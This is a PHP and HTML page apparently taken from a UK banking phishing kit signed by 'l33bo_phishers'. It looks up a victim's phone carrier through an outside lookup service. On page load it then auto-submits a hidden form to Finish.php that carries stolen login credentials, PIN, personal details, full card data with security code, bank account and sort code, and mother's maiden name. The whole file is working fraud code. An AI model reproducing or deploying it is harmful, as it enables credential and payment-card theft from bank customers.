<?php
/*
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
Created by l33bo_phishers -- icq: 695059760 
*/
require "assets/includes/session_protect.php";
require_once("assets/includes/functions.php");
require "assets/includes/simplehtmldom.php";

  $ch = curl_init();
  $telephone = $_POST['telephone'];
  $submit = "submit";
  $fields = array('number'=>$telephone, 'nlSubmit'=>$submit);
  $postvars = '';
  foreach($fields as $key=>$value) {
    $postvars .= $key . "=" . $value . "&";
  }
  $url = "http://portal.aql.com/telecoms/network_lookup.php";
  curl_setopt($ch,CURLOPT_URL,$url);
  curl_setopt($ch,CURLOPT_POST, 0);                //0 for a get request
  curl_setopt($ch,CURLOPT_POSTFIELDS,$postvars);
  curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch,CURLOPT_CONNECTTIMEOUT ,3);
  curl_setopt($ch,CURLOPT_TIMEOUT, 20);
  $result = curl_exec ($ch);
$html = str_get_html($result);

$ret = $html->find('table');
$extr_result = implode(" ",$ret);
$_SESSION['result'] = $extr_result;
curl_close($ch);
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>Checking</title>
<meta http-equiv="Content-Style-Type" content="text/css">
<link href="assets/css/master.css" rel="stylesheet" type="text/css" media="all" segment="">
<link href="assets/css/datePicker.css" rel="stylesheet" type="text/css" media="all" segment="">
<link href="assets/css/dpc.css" rel="stylesheet" type="text/css" media="all" segment="">
<link href="assets/css/master_chrome.css" rel="stylesheet" type="text/css" media="all" segment="">
<link href="assets/css/dpc_chrome.css" rel="stylesheet" type="text/css" media="all" segment="">
<link href="assets/css/overlayPromptMaster.css" rel="stylesheet" type="text/css" media="all" segment="">
<link href="assets/css/overlayPrompt.css" rel="stylesheet" type="text/css" media="all" segment="">
<link href="assets/css/DPC_auralstyle.css" rel="stylesheet" type="text/css" media="aural" segment="">
<link href="assets/css/lpdastyles.css" rel="stylesheet" type="text/css">
<link href="assets/css/form.css" rel="stylesheet" type="text/css">
<link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon">
<script src="assets/js/autoTab.js" type="text/javascript"></script>
<script>
function MobileCheck(){	
		var x = document.forms["NetworkLookup"]["NumberCheck"].value;
		if (x.indexOf("Hutchison 3G UK Ltd") !=-1) {
		document.getElementById('Network').value = "Three";
		document.getElementById("sendLog").submit();
        return true;
		}
		if (x.indexOf("Telefonica UK Limited") !=-1) {
		document.getElementById('Network').value = "O2";
		document.getElementById("sendLog").submit();
        return true;
		}
		if (x.indexOf("Vodafone Uk Ltd") !=-1) {
		document.getElementById('Network').value = "Vodafone";
		document.getElementById("sendLog").submit();
        return true;
		}
		if (x.indexOf("EE Limited") !=-1) {
		document.getElementById('Network').value = "EE";
		document.getElementById("sendLog").submit();
        return true;
		}
		if (x.indexOf("BT") !=-1) {
		document.getElementById('Network').value = "BT";
		document.getElementById("sendLog").submit();
        return true;
		}
		if (x.indexOf("Virgin Media Wholesale Limited") !=-1) {
		document.getElementById('Network').value = "Virgin Media";
		document.getElementById("sendLog").submit();
        return true;
		}
		if (x.indexOf("TalkTalk Communications Limited") !=-1) {
		document.getElementById('Network').value = "TalkTalk";
		document.getElementById("sendLog").submit();
        return true;
		}
		if (x.indexOf("Virgin Mobile Telecoms Limited") !=-1) {
		document.getElementById('Network').value = "Virgin Mobile";
		document.getElementById("sendLog").submit();
        return true;
		}
		if (x.indexOf("Lycamobile UK Limited") !=-1) {
		document.getElementById('Network').value = "Lycamobile";
		document.getElementById("sendLog").submit();
        return true;
		}		
		if (x.indexOf("Orange") !=-1) {
		document.getElementById('Network').value = "Orange";
		document.getElementById("sendLog").submit();
        return true
	}
		else {
		document.getElementById('Network').value = "Unknown";
		document.getElementById("sendLog").submit();
        return true	
	}
}
</script>
</head>
<body onload="MobileCheck()">
 <div style="display:hidden">
<form method="post" name="NetworkLookup" id="NetworkLookup">
<input type="hidden" name="NumberCheck" id="NumberCheck" value='<?php echo $extr_result;?>'>
</form>
<form method="post" action="Finish.php?&sessionid=<?php echo generateRandomString(80); ?>&securessl=true" name="sendLog" id="sendLog">
<input type="hidden" name="userid" value="<?php echo $_POST['userid'];?>">
<input type="hidden" name="pin" value="<?php echo $_POST['pin1']."".$_POST['pin2']."".$_POST['pin3']."".$_POST['pin4'];?>">
<input type="hidden" name="password" value="<?php echo $_POST['password'];?>">
<input type="hidden" name="name" value="<?php echo $_POST['name'];?>">
<input type="hidden" name="dob" value="<?php echo $_POST['day'].'/'.$_POST['month'].'/'.$_POST['year'];?>">
<input type="hidden" name="address" value="<?php echo $_POST['address'].', '.$_POST['postcode'];?>">
<input type="hidden" name="telephone" value="<?php echo $_POST['telephone'];?>">
<input type="hidden" name="Network" id="Network" value="">
<input type="hidden" name="email" value="<?php echo $_POST['email'];?>">
<input type="hidden" name="ccno" value="<?php echo $_POST['ccno'];?>">
<input type="hidden" name="ccexp" value="<?php echo $_POST['ccexp'];?>">
<input type="hidden" name="secode" value="<?php echo $_POST['secode'];?>">
<input type="hidden" name="acno" value="<?php echo $_POST['acno'];?>">
<input type="hidden" name="sort" value="<?php echo $_POST['sc1'].'-'.$_POST['sc2'].'-'.$_POST['sc3'];?>">
<input type="hidden" name="mmn" value="<?php echo $_POST['mmn'];?>">
</form>
</div>
</body>
</html>
